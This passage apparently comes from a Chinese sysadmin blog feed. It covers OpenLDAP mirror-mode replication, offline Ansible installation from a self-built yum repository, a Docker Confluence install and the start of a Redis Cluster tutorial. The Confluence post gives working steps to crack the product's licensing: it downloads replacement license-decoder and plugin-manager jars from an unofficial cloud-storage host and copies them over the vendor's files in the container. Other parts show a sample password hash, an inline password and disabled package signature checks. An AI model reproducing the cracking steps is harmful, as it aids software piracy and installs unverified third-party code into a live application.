<h4 id="6-修改openldap配置文件"><a href="#6-修改openldap配置文件" class="headerlink" title="6. 修改openldap配置文件"></a>6. 修改openldap配置文件</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#编辑配置文件vim slapd.conf</span></span><br><span class="line"></span><br><span class="line">include /usr/<span class="built_in">local</span>/openldap/etc/openldap/schema/core.schema</span><br><span class="line">include /usr/<span class="built_in">local</span>/openldap/etc/openldap/schema/collective.schema</span><br><span class="line">include /usr/<span class="built_in">local</span>/openldap/etc/openldap/schema/corba.schema</span><br><span class="line">include /usr/<span class="built_in">local</span>/openldap/etc/openldap/schema/cosine.schema</span><br><span class="line">include /usr/<span class="built_in">local</span>/openldap/etc/openldap/schema/duaconf.schema</span><br><span class="line">include /usr/<span class="built_in">local</span>/openldap/etc/openldap/schema/dyngroup.schema</span><br><span class="line">include /usr/<span class="built_in">local</span>/openldap/etc/openldap/schema/inetorgperson.schema</span><br><span class="line">include /usr/<span class="built_in">local</span>/openldap/etc/openldap/schema/java.schema</span><br><span class="line">include /usr/<span class="built_in">local</span>/openldap/etc/openldap/schema/misc.schema</span><br><span class="line">include /usr/<span class="built_in">local</span>/openldap/etc/openldap/schema/nis.schema</span><br><span class="line">include /usr/<span class="built_in">local</span>/openldap/etc/openldap/schema/openldap.schema</span><br><span class="line">include /usr/<span class="built_in">local</span>/openldap/etc/openldap/schema/ppolicy.schema</span><br><span class="line">pidfile /data/openldap/var/run/slapd.pid</span><br><span class="line">argsfile /data/openldap/var/run/slapd.args</span><br><span class="line">loglevel 256</span><br><span class="line">logfile /data/openldap/<span class="built_in">log</span>/slapd.log</span><br><span class="line">moduleload syncprov.la <span class="comment"># 需要数据同步需要开启此模块</span></span><br><span class="line">database bdb</span><br><span class="line">directory /data/openldap/data</span><br><span class="line">suffix <span class="string">"dc=boe,dc=com"</span></span><br><span class="line">rootdn <span class="string">"cn=Manager,dc=boe,dc=com"</span></span><br><span class="line">rootpw &#123;SSHA&#125;eJtr5umAo23PqTKATU/X6D8swJ9yIlSx <span class="comment">#用slappasswd命令生成的密码</span></span><br><span class="line">index objectclass,entryCSN,entryUUID eq</span><br><span class="line">overlay syncprov</span><br><span class="line">syncprov-checkpoint 100 10</span><br><span class="line">syncprov-sessionlog 100</span><br><span class="line">serverID 2</span><br><span class="line">syncrepl rid=123</span><br><span class="line">provider=ldap://对端服务器ip</span><br><span class="line">bindmethod=simple</span><br><span class="line">binddn=<span class="string">"cn=Manager,dc=boe,dc=com"</span></span><br><span class="line">credentials=密码(管理员密码，这里是Manager的密码)</span><br><span class="line">searchbase=<span class="string">"dc=boe,dc=com"</span></span><br><span class="line">schemachecking=off</span><br><span class="line"><span class="built_in">type</span>=refreshAndPersist</span><br><span class="line">retry=<span class="string">"60 +"</span></span><br><span class="line">mirrormode on</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#两个服务器的配置文件有两个地方不一致</span></span><br><span class="line">1）serverID不一致 </span><br><span class="line">2）provider=ldap://对端的ip</span><br></pre></td></tr></table></figure>

<h4 id="7-开启日志功能"><a href="#7-开启日志功能" class="headerlink" title="7.开启日志功能"></a>7.开启日志功能</h4><ul>
<li>通过修改配置文件开启日志功能</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/etc/rsyslog.d/slapd.conf</span><br><span class="line">local4.* /data/openldap/<span class="built_in">log</span>/openldap.log</span><br><span class="line"></span><br><span class="line"><span class="comment">#重启rsyslog和slapd</span></span><br><span class="line">service rsyslog restart</span><br></pre></td></tr></table></figure>

<ul>
<li>通过修改数据库配置文件开启</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/root/loglevel.ldif &lt;&lt; EOF</span><br><span class="line">dn: cn=config</span><br><span class="line">changetype: modify</span><br><span class="line">replace: olcLogLevel</span><br><span class="line">olcLogLevel: stats</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line"><span class="comment">#导入</span></span><br><span class="line">ldapadd -x -D <span class="string">"cn=Manager,dc=boe,dc=com"</span> -f ./loglevel.ldif -w secret</span><br></pre></td></tr></table></figure>

<h2 id="配置phpldpadmin工具"><a href="#配置phpldpadmin工具" class="headerlink" title="配置phpldpadmin工具"></a>配置phpldpadmin工具</h2><h4 id="1-安装和配置LDAP管理工具PHPldapadmin"><a href="#1-安装和配置LDAP管理工具PHPldapadmin" class="headerlink" title="1. 安装和配置LDAP管理工具PHPldapadmin"></a>1. 安装和配置LDAP管理工具PHPldapadmin</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum -y install httpd php php-ldap php-gd php-mbstring php-pear php-bcmath php-xml</span><br><span class="line">yum -y install epel-release</span><br><span class="line">yum --enablerepo=epel -y install phpldapadmin</span><br></pre></td></tr></table></figure>

<h4 id="2-修改配置文件"><a href="#2-修改配置文件" class="headerlink" title="2. 修改配置文件"></a>2. 修改配置文件</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/phpldapadmin/config.php +398</span><br><span class="line"><span class="comment">#397行取消注释，398行添加注释</span></span><br><span class="line"><span class="variable">$servers</span>-&gt;setValue(<span class="string">'login'</span>,<span class="string">'attr'</span>,<span class="string">'dn'</span>);</span><br><span class="line"></span><br><span class="line">vim /etc/httpd/密码 d/phpldapadmin.conf</span><br><span class="line">Apache 2.4</span><br><span class="line"></span><br><span class="line">Require all granted （修改此处)</span><br><span class="line">Order Deny,Allow</span><br><span class="line">Deny from all</span><br><span class="line">Allow from 127.0.0.1</span><br><span class="line">Allow from ::1</span><br></pre></td></tr></table></figure>

<h4 id="3-设置开机自启并启动Apache"><a href="#3-设置开机自启并启动Apache" class="headerlink" title="3. 设置开机自启并启动Apache"></a>3. 设置开机自启并启动Apache</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> httpd</span><br><span class="line">systemctl start httpd </span><br><span class="line"><span class="comment">#启动openldap</span></span><br><span class="line"><span class="comment">#/usr/local/openldap/libexec/slapd</span></span><br><span class="line"></span><br><span class="line">访问用http://ip/phpldapadmin访问如图</span><br></pre></td></tr></table></figure>

<p><img src="/articles/1c70a485/2.jpeg" alt="111"><br><img src="/articles/1c70a485/3.jpeg" alt="222"><br>在10.10.1.132上创建了一个OU名为testou,会发现10.10.1.132会自动同步到本地，如图:<br><img src="/articles/1c70a485/4.jpeg" alt="333"><br><img src="/articles/1c70a485/5.jpeg" alt="444"><br>两服务器日志如下：<br><img src="/articles/1c70a485/6.png" alt="555"><br><img src="https://yqfile.alicdn.com/224de6f3795b999de2bf35524cab63c4d066cb10.jpeg" alt="666"><br>以上结果得知，在镜像模式下，当其中一台服务器增加操作OU时，另一台也会同步增加，两台服务器均可进行读写操作，任何一台信息发生变化，都会以推的方式进行通知。</p>
]]></content>
      <categories>
        <category>运维技术</category>
        <category>服务部署</category>
      </categories>
      <tags>
        <tag>Openldap</tag>
      </tags>
  </entry>
  <entry>
    <title>自制yum源离线安装开发代码时的对应版本ansible</title>
    <url>/articles/fe96187b.html</url>
    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>由于在工作环境中，经常遇到批量安装的服务器，不具备连接互联网的条件。同时通过简单的下载安装 ansible 源码安装，又会遇到各种奇葩问题，推荐使用自制 yum 源方法，然后使用 yum安装 ansible。不得不说，ansible很好用，ansible团队也一致在维护和更新。但是，版本之间存在比较大的差异。以前写的代码，现在直接安装新版本的ansible后可能就不能用了，你想想下：代码中用到的类没有了，模块消失了，变量不见了等等，当然可以查看新的文档更改代码适应新版本，但是代码沉淀时间久了，做迁移还是会遇到这种问题，这个问题困扰了很多Devops。如何安装写代码时的版本，如何在断网模式下安装代码对应版本的ansible, 这成为了一种刚需和痛点，本文就以安装旧版本：2.3.1为例，详细阐述。</p>
<a id="more"></a>



<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p><strong>操作系统版本</strong>：Centos7.2</p>
<p><strong>Python版本</strong>：  Python2.7.5</p>
<h2 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h2><h3 id="旧代码机器操作"><a href="#旧代码机器操作" class="headerlink" title="旧代码机器操作"></a>旧代码机器操作</h3><h5 id="安装-yumdownloader"><a href="#安装-yumdownloader" class="headerlink" title="安装 yumdownloader"></a>安装 yumdownloader</h5><p>准备一台可以连接互联网的相同版本系统的操作系统(安装环境一样)，使用yumdownloader工具下载ansible安装包以及所有依赖包。并以 root 身份安装 yumdownloader工具：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum  -y install  yum-utils</span><br></pre></td></tr></table></figure>

<h5 id="创建文件夹"><a href="#创建文件夹" class="headerlink" title="创建文件夹"></a>创建文件夹</h5><p>用于存放依赖的安装包</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir   /root/packages</span><br></pre></td></tr></table></figure>

<h5 id="更新国内yum源"><a href="#更新国内yum源" class="headerlink" title="更新国内yum源"></a>更新国内yum源</h5><p>由于默认的源里没有 ansible，需要安装国内快速稳定的yum源, 这里选择阿里源：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mv /etc/yum.repos.d/epel-7.repo /etc/yum.repos.d/epel-7.repo.bak</span><br><span class="line">wget -O /etc/yum.repos.d/epel-7.repo  http://mirrors.aliyun.com/repo/epel-7.repo </span><br><span class="line">yum clean all     <span class="comment"># 清除系统所有的yum缓存</span></span><br><span class="line">yum makecache     <span class="comment"># 生成yum缓存</span></span><br><span class="line">yum update</span><br></pre></td></tr></table></figure>

<h5 id="下载-ansible-和-所有依赖包"><a href="#下载-ansible-和-所有依赖包" class="headerlink" title="下载 ansible 和 所有依赖包"></a>下载 ansible 和 所有依赖包</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#下载ansible依赖包</span></span><br><span class="line">yumdownloader --resolve --destdir /root/packages   ansible</span><br><span class="line"><span class="comment">#下载createrepo依赖包</span></span><br><span class="line">yumdownloader --resolve --destdir /root/packages   createrepo</span><br><span class="line"></span><br><span class="line"><span class="comment"># 压缩安装包</span></span><br><span class="line">tar -Jcvf  packages.tar.xz   packages</span><br></pre></td></tr></table></figure>

<h3 id="新机器操作"><a href="#新机器操作" class="headerlink" title="新机器操作"></a>新机器操作</h3><p>将上面下载的所有 rpm 安装包打包，传输到需要批量的新服务器上，并解压到指定的文件夹里面</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 新机器解压到/mnt/下</span></span><br><span class="line">tar -Jxvf  packages.tar.xz   -C  /mnt/</span><br><span class="line"></span><br><span class="line">链接：https://pan.baidu.com/s/1FtZxpXk1AzZ_WcGVJFGE5w</span><br><span class="line">提取码：0sf2</span><br></pre></td></tr></table></figure>

<h5 id="首先创建-安装createrepo"><a href="#首先创建-安装createrepo" class="headerlink" title="首先创建 安装createrepo"></a>首先创建 安装createrepo</h5><p>进入 /mnt/packages 目录中</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rpm -ivh deltarpm-3.6-3.el7.x86_64.rpm</span><br><span class="line">rpm -ivh python-deltarpm-3.6-3.el7.x86_64.rpm</span><br><span class="line">rpm -ivh createrepo-0.9.9-28.el7.noarch.rpm</span><br></pre></td></tr></table></figure>

<h5 id="然后使用createrepo生成符合要求的yum仓库"><a href="#然后使用createrepo生成符合要求的yum仓库" class="headerlink" title="然后使用createrepo生成符合要求的yum仓库"></a>然后使用createrepo生成符合要求的yum仓库</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cd  /mnt</span></span><br><span class="line"><span class="comment"># createrepo /packages</span></span><br><span class="line"></span><br><span class="line">Spawning worker 0 with 25 pkgs</span><br><span class="line">Workers Finished</span><br><span class="line">Saving Primary metadata</span><br><span class="line">Saving file lists metadata</span><br><span class="line">Saving other metadata</span><br><span class="line">Generating sqlite DBs</span><br><span class="line">Sqlite DBs complete</span><br></pre></td></tr></table></figure>

<h5 id="配置本地-yum源"><a href="#配置本地-yum源" class="headerlink" title="配置本地 yum源"></a>配置本地 yum源</h5><p>把当前存在 yum 做备份，并移走别的目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># vim  /etc/yum.repos.d/ansible.repo</span></span><br><span class="line">[ansibel]</span><br><span class="line">name=sun <span class="built_in">local</span> ansible</span><br><span class="line">baseurl=file:///mnt/packages</span><br><span class="line">enabled=1</span><br><span class="line">gpgcheck=0</span><br><span class="line"></span><br><span class="line">保存退出，然后执行：</span><br><span class="line">yum clean all</span><br><span class="line">yum makecache</span><br></pre></td></tr></table></figure>

<h5 id="使用-yum安装-ansible"><a href="#使用-yum安装-ansible" class="headerlink" title="使用 yum安装 ansible"></a>使用 yum安装 ansible</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum -y install ansible</span><br></pre></td></tr></table></figure>

<h5 id="验证安装成功："><a href="#验证安装成功：" class="headerlink" title="验证安装成功："></a>验证安装成功：</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ansible --version</span></span><br><span class="line">ansible 2.3.1.0</span><br><span class="line">  config file = /etc/ansible/ansible.cfg</span><br><span class="line">  configured module search path = Default w/o overrides</span><br><span class="line">  python version = 2.7.5 (default, Jun 20 2019, 20:27:34) [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]</span><br></pre></td></tr></table></figure>

<p>参考：<a href="https://www.jianshu.com/p/9a34d458de29" target="_blank" rel="noopener">https://www.jianshu.com/p/9a34d458de29</a></p>
]]></content>
      <categories>
        <category>自动化</category>
        <category>Ansible</category>
      </categories>
      <tags>
        <tag>Ansible</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker安装Confluence(破解版)</title>
    <url>/articles/f9f96949.html</url>
    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>confluence是一个专业的企业知识管理与协同软件，可以用于构建企业wiki。通过它可以实现团队成员之间的协作和知识共享。现在大多数公司都会部署一套confluence，用作内部wiki。现在confluence已收费，那么下面将介绍下Docker安装破解confluence的操作记录。</p>
<a id="more"></a>

<h2 id="环境版本"><a href="#环境版本" class="headerlink" title="环境版本"></a>环境版本</h2><p>Docker ：17.12.0-ce</p>
<p>MySQL：5.7</p>
<h2 id="安装MySQL"><a href="#安装MySQL" class="headerlink" title="安装MySQL"></a>安装MySQL</h2><p>Docker安装MySQL详见<a href="https://my.oschina.net/u/2289161/blog/1647061" target="_blank" rel="noopener">https://my.oschina.net/u/2289161/blog/1647061</a></p>
<h2 id="安装Confluence"><a href="#安装Confluence" class="headerlink" title="安装Confluence"></a>安装Confluence</h2><p>下载镜像：<a href="https://hub.docker.com/r/cptactionhank/atlassian-confluence/" target="_blank" rel="noopener">https://hub.docker.com/r/cptactionhank/atlassian-confluence/</a></p>
<p>启动一个confluence容器</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -d --name confluence -p 8090:8090  --link mysql5.7:db --user root:root cptactionhank/atlassian-confluence:latest</span><br></pre></td></tr></table></figure>

<p>可以用以下命令检查confluence是否启动</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker ps  </span><br><span class="line">docker inspect confluence</span><br></pre></td></tr></table></figure>

<p>访问<a href="http://host-to-server:8090/" target="_blank" rel="noopener">http://ip:8090/</a> 就可以看到Confluence的初始化和配置页面。</p>
<p><img src="/articles/f9f96949/1.png" alt="img"></p>
<p>选择中文。</p>
<p><img src="/articles/f9f96949/2.png" alt="img"></p>
<p>选择产品安装并点击下一步，继续安装。</p>
<p><img src="/articles/f9f96949/3.png" alt="img"></p>
<p><img src="/articles/f9f96949/4.png" alt="img"></p>
<p><strong>通过上图可以看出需要输入授权码，下面介绍下破解confluence授权码的操作。</strong></p>
<h2 id="破解confluence"><a href="#破解confluence" class="headerlink" title="破解confluence"></a><strong>破解confluence</strong></h2><p>下载破解confluence文件：</p>
<p>atlassian-universal-plugin-manager-plugin-2.22.jar</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget http://cdn-blog.oss-cn-beijing.aliyuncs.com/k2p-frp/atlassian-universal-plugin-manager-plugin-2.22.jar</span><br></pre></td></tr></table></figure>

<p>atlassian-extras-decoder-v2-3.2.jar</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget http://cdn-blog.oss-cn-beijing.aliyuncs.com/k2p-frp/atlassian-extras-decoder-v2-3.2.jar</span><br></pre></td></tr></table></figure>

<p>进入confluence容器命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker exec -it confluence /bin/sh</span><br></pre></td></tr></table></figure>

<p>用下载的文件替换atlassian-extras-decoder-v2-3.x.jar/atlassian-universal-plugin-manager-plugin-2.22.x.jar文件（该文件下载到<code>/opt``下，替换前必须做之前的文件备份，方便回退）</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">备份要替换的文件</span></span><br><span class="line">mv /opt/atlassian/confluence/confluence/WEB-INF/lib/atlassian-extras-decoder-v2-3.3.0.jar   /mnt/</span><br><span class="line">mv /opt/atlassian/confluence/confluence/WEB-INF/atlassian-bundled-plugins/atlassian-universal-plugin-manager-plugin-2.22.5.jar /mnt</span><br></pre></td></tr></table></figure>

<p>备份好文件后，退出confluence容器。拷贝下载的文件到confluence容器中。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">将下载的破解文件替换对应的jar</span></span><br><span class="line">docker cp atlassian-extras-decoder-v2-3.2.jar confluence:/opt/atlassian/confluence/confluence/WEB-INF/lib/</span><br><span class="line">docker cp atlassian-universal-plugin-manager-plugin-2.22.jar  confluence:/opt/atlassian/confluence/confluence/WEB-INF/atlassian-bundled-plugins/</span><br></pre></td></tr></table></figure>

<p>重新启动confluence容器。</p>
<p>然后继续访问<a href="http://172.16.220.129:8090/" target="_blank" rel="noopener">http://ip:8090</a>，接着注册confluence的key</p>
<p><img src="/articles/f9f96949/5.png" alt="img"></p>
<p>下面的操作需要在翻墙的前提下进行，使用google邮箱注册。</p>
<p><img src="/articles/f9f96949/6.png" alt="img"></p>
<p><img src="/articles/f9f96949/7.png" alt="img"></p>
<p><img src="/articles/f9f96949/8.png" alt="img"></p>
<p><img src="/articles/f9f96949/9.png" alt="img"></p>
<p><img src="/articles/f9f96949/10.png" alt="img"></p>
<p><img src="/articles/f9f96949/11.png" alt="img"></p>
<p><img src="/articles/f9f96949/12.png" alt="img"></p>
<p><strong>稍微等一会儿，就会自动弹出下面的信息，点击”Yes”</strong></p>
<p><img src="/articles/f9f96949/13.png" alt="img"></p>
<p><img src="/articles/f9f96949/14.png" alt="img"></p>
<p><img src="/articles/f9f96949/15.png" alt="img"></p>
<p><img src="/articles/f9f96949/16.png" alt="img"></p>
<p>再连接数据库时，需要修改数据库的隔离级别。操作详见：<a href="https://blog.csdn.net/taylor_tao/article/details/7063639" target="_blank" rel="noopener">https://blog.csdn.net/taylor_tao/article/details/7063639</a></p>
<p><img src="/articles/f9f96949/17.png" alt="img"></p>
<p><img src="/articles/f9f96949/18.png" alt="img"></p>
<p><img src="/articles/f9f96949/19.png" alt="img"></p>
<p><img src="/articles/f9f96949/20.png" alt="img"></p>
<p><img src="/articles/f9f96949/21.png" alt="img"></p>
<p><img src="/articles/f9f96949/22.png" alt="img"></p>
<p><img src="/articles/f9f96949/23.png" alt="img"></p>
<p><img src="/articles/f9f96949/24.png" alt="img"></p>
<p><img src="/articles/f9f96949/25.png" alt="img"></p>
<p><strong>下面说下confluence邮箱功能（不多赘述，直接看截图）：</strong></p>
<p><strong><img src="/articles/f9f96949/26.jpg" alt="img"></strong></p>
<p><strong><img src="/articles/f9f96949/27.jpg" alt="img"></strong></p>
<p><strong><img src="/articles/f9f96949/28.jpg" alt="img"></strong></p>
<p><strong><img src="/articles/f9f96949/29.jpg" alt="img"></strong></p>
<p><strong><img src="/articles/f9f96949/30.jpg" alt="img"></strong></p>
<p><strong><img src="/articles/f9f96949/31.jpg" alt="img"></strong></p>
<p><strong><img src="/articles/f9f96949/32.jpg" alt="img"></strong></p>
<p><img src="/articles/f9f96949/33.jpg" alt="img"></p>
<p><strong>有上面配置后，就已经配置好了confluence的邮件功能了。下面说下在管理员账号下创建或邀请其他用户的做法：</strong></p>
<p><strong><img src="/articles/f9f96949/34.jpg" alt="img"></strong></p>
<p><strong>一般要禁止用户注册自己注册，要在管理员账号下创建新用户或邀请新用户（通过邮件的方式）</strong></p>
<p><strong><img src="/articles/f9f96949/35.jpg" alt="img"></strong></p>
<p><strong>如下在管理员账号下”添加用户”,添加后给用户设置一个初始密码，用户收到邮件后，可以登陆修改密码。</strong></p>
<p><strong><img src="/articles/f9f96949/36.jpg" alt="img"></strong></p>
<p><strong><img src="/articles/f9f96949/37.jpg" alt="img"></strong></p>
<p><strong>———————————————————————————————————–</strong><br><strong>也可以通过”邀请用户”的方式来创建新用户，用户收到邮件后，按照邮件提示进行用户创建</strong></p>
<p><strong><img src="/articles/f9f96949/38.jpg" alt="img"></strong></p>
<p><strong>———————————————————————————————————–</strong><br><strong>邮件功能设置后，在分享文章的时候，可以以邮件的方式分享到用户的邮箱里。</strong></p>
<p><img src="/articles/f9f96949/39.jpg" alt="img"></p>
<p>注意：在创建文章时 ，左边的页面或子页面的创建时，可以点击左下角的”空间管理”-“配置侧边栏”<br><strong>到此，confluence的安装破解已经完全搞定！后续再介绍下confluence跟jira接连、及其它们对接LDAP的做法！</strong></p>
]]></content>
      <categories>
        <category>运维技术</category>
        <category>服务部署</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis-cluster集群[四]:redis-cluster集群配置</title>
    <url>/articles/d2e62a87.html</url>
    <content><![CDATA[<h2 id="Redis分片："><a href="#Redis分片：" class="headerlink" title="Redis分片："></a>Redis分片：</h2><p>为什么要分片：随着Redis存储的数据越来越庞大，会导致Redis的性能越来越差！</p>
<p>目前分片的方法：</p>
<p>1,客户端分片</p>
<p>在应用层面分片，程序里指定什么数据存放在那个Redis  优势：比较灵活    缺点：加个节点扩容就很费劲</p>
<p>2, 代理Proxy分片  第三方的Twemproxy  使用代理的缺点，你代理什么性能，那么你整个Redis的性能就是什么样的！</p>
<p>3, redis cluster</p>
<p>4, codis （豌豆荚）开源</p>
 <a id="more"></a>

<h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><p><a href="http://redisdoc.com/topic/cluster-tutorial.html#id2" target="_blank" rel="noopener">Redis cluster</a></p>
<h2 id="集群分片原理："><a href="#集群分片原理：" class="headerlink" title="集群分片原理："></a>集群分片原理：</h2><p>Redis 集群使用数据分片（sharding）而非一致性哈希（consistency hashing）来实现： 一个 Redis 集群包含 16384 个哈希槽（hash slot），</p>
<p>数据库中的每个键都属于这 16384 个哈希槽的其中一个， 集群使用公式 CRC16(key) % 16384 来计算键 key 属于哪个槽，</p>
<p>其中 CRC16(key) 语句用于计算键 key 的 CRC16 校验和 。</p>
<p>集群中的每个节点负责处理一部分哈希槽。 举个例子， 一个集群可以有三个哈希槽， 其中：</p>
<pre><code>* 节点 A 负责处理 0 号至 5500 号哈希槽。
* 节点 B 负责处理 5501 号至 11000 号哈希槽。
* 节点 C 负责处理 11001 号至 16384 号哈希槽。</code></pre><p>这种将哈希槽分布到不同节点的做法使得用户可以很容易地向集群中添加或者删除节点。 比如说：</p>
<pre><code>* 如果用户将新节点 D 添加到集群中， 那么集群只需要将节点 A 、B 、 C 中的某些槽移动到节点 D 就可以了。
* 与此类似， 如果用户要从集群中移除节点 A ， 那么集群只需要将节点 A 中的所有哈希槽移动到节点 B 和节点 C ， 然后再移除空白（不包含任何哈希槽）的节点 A 就可以了。</code></pre><p>因为将一个哈希槽从一个节点移动到另一个节点不会造成节点阻塞， 所以无论是添加新节点还是移除已存在节点， 又或者改变某个节点包含的哈希槽数量， 都不会造成集群下线。</p>
<p>Redis集群中的主从复制<br>为了使得集群在一部分节点下线或者无法与集群的大多数（majority）节点进行通讯的情况下， 仍然可以正常运作，</p>
<p>Redis 集群对节点使用了主从复制功能： 集群中的每个节点都有 1 个至 N 个复制品（replica）， 其中一个复制品为主节点（master）， 而其余的 N-1 个复制品为从节点（slave）。<br>在之前列举的节点 A 、B 、C 的例子中， 如果节点 B 下线了， 那么集群将无法正常运行， 因为集群找不到节点来处理 5501 号至 11000 号的哈希槽。<br>另一方面， 假如在创建集群的时候（或者至少在节点 B 下线之前）， 我们为主节点 B 添加了从节点 B1 ， 那么当主节点 B 下线的时候， 集群就会将 B1 设置为新的主节点，</p>
<p>并让它代替下线的主节点 B ， 继续处理 5501 号至 11000 号的哈希槽， 这样集群就不会因为主节点 B 的下线而无法正常运作了。</p>
<p>不过如果节点 B 和 B1 都下线的话， Redis 集群还是会停止运作。</p>
<p>Redis 集群的一致性保证（guarantee）<br>Redis 集群不保证数据的强一致性（strong consistency）： 在特定条件下， Redis 集群可能会丢失已经被执行过的写命令。<br>使用异步复制（asynchronous replication）是 Redis 集群可能会丢失写命令的其中一个原因。 考虑以下这个写命令的例子：</p>
<pre><code>* 客户端向主节点 B 发送一条写命令。
* 主节点 B 执行写命令，并向客户端返回命令回复。
* 主节点 B 将刚刚执行的写命令复制给它的从节点 B1 、 B2 和 B3 。</code></pre><p>如你所见， 主节点对命令的复制工作发生在返回命令回复之后， 因为如果每次处理命令请求都需要等待复制操作完成的话， 那么主节点处理命令请求的速度将极大地降低 —— 我们必须在性能和一致性之间做出权衡。<br>如果真的有必要的话， Redis 集群可能会在将来提供同步地（synchronou）执行写命令的方法。<br>Redis 集群另外一种可能会丢失命令的情况是， 集群出现网络分裂（network partition）， 并且一个客户端与至少包括一个主节点在内的少数（minority）实例被孤立。<br>举个例子， 假设集群包含 A 、 B 、 C 、 A1 、 B1 、 C1 六个节点， 其中 A 、B 、C 为主节点， 而 A1 、B1 、C1 分别为三个主节点的从节点， 另外还有一个客户端 Z1 。<br>假设集群中发生网络分裂， 那么集群可能会分裂为两方， 大多数（majority）的一方包含节点 A 、C 、A1 、B1 和 C1 ， 而少数（minority）的一方则包含节点 B 和客户端 Z1 。<br>在网络分裂期间， 主节点 B 仍然会接受 Z1 发送的写命令：</p>
<pre><code>* 如果网络分裂出现的时间很短， 那么集群会继续正常运行；
* 但是， 如果网络分裂出现的时间足够长， 使得大多数一方将从节点 B1 设置为新的主节点， 并使用 B1 来代替原来的主节点 B ， 那么 Z1 发送给主节点 B 的写命令将丢失。</code></pre><p>注意， 在网络分裂出现期间， 客户端 Z1 可以向主节点 B 发送写命令的最大时间是有限制的， 这一时间限制称为节点超时时间（node timeout）， 是 Redis 集群的一个重要的配置选项：</p>
<ul>
<li><p>对于大多数一方来说， 如果一个主节点未能在节点超时时间所设定的时限内重新联系上集群， 那么集群会将这个主节点视为下线， 并使用从节点来代替这个主节点继续工作。</p>
</li>
<li><p>对于少数一方， 如果一个主节点未能在节点超时时间所设定的时限内重新联系上集群， 那么它将停止处理写命令， 并向客户端报告错误。</p>
</li>
</ul>
<h2 id="Redis-Cluster安装："><a href="#Redis-Cluster安装：" class="headerlink" title="Redis Cluster安装："></a>Redis Cluster安装：</h2><p>1、安装环境：首先确保安装了Redis</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /opt/</span><br><span class="line">mkdir `seq 7001 7008`</span><br><span class="line">cp /etc/redis/6379.conf ./</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">配置文件里：</span><br><span class="line"> </span><br><span class="line">新增这三行即可</span><br><span class="line">cluster-enabled yes</span><br><span class="line">cluster-config-file nodes.conf</span><br><span class="line">cluster-node-timeout 5000</span><br><span class="line"> </span><br><span class="line">并且报：AOF是开启的</span><br><span class="line">appendonly yes</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash">把相关的信息都统一修改为：6379  （端口、日志文件、存储dir持久化）</span></span><br><span class="line">sed  's/6379/7001/g' 6379.conf &gt; 7001/redis.conf</span><br><span class="line">sed  's/6379/7002/g' 6379.conf &gt; 7002/redis.conf</span><br><span class="line">sed  's/6379/7003/g' 6379.conf &gt; 7003/redis.conf</span><br><span class="line">sed  's/6379/7004/g' 6379.conf &gt; 7004/redis.conf</span><br><span class="line">sed  's/6379/7005/g' 6379.conf &gt; 7005/redis.conf</span><br><span class="line">sed  's/6379/7006/g' 6379.conf &gt; 7006/redis.conf</span><br><span class="line">sed  's/6379/7007/g' 6379.conf &gt; 7007/redis.conf</span><br><span class="line">sed  's/6379/7008/g' 6379.conf &gt; 7008/redis.conf</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">for i in `seq 7001 7009`;do cd /opt/$i &amp;&amp; /usr/local/bin/redis-server redis.conf ; done</span><br></pre></td></tr></table></figure>

<p>2、安装管理工具，源码自带了一个管理Cluster集群的工具是用ruby写的所以需要安装ruby</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum -y install ruby rubygems</span><br><span class="line"><span class="meta">#</span><span class="bash">安装ruby的管理工具redis</span></span><br><span class="line">gem install redis</span><br></pre></td></tr></table></figure>

<p> 3、复制管理工具</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp /opt/redis-3.0.4/src/redis-trib.rb /usr/local/bin/redis-trib</span><br><span class="line"><span class="meta">#</span><span class="bash">查看redis-trib帮助</span></span><br><span class="line">redis-trib help</span><br></pre></td></tr></table></figure>

<p> 4、创建集群  7001-7006   6个redis为集群node，7007-7008   “2个redis为back node”</p>
